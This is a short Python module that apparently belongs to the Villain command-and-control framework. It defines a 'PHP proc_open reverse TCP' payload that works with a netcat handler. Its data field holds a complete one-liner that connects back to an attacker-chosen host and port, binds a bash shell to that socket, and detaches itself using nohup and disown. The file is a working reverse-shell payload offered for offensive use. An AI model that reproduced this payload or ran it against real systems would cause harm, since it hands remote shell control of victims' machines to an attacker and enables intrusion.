# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'PHP proc_open reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'PHP proc_open reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'php-proc-open',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' > /dev/null 2>&1 & disown"
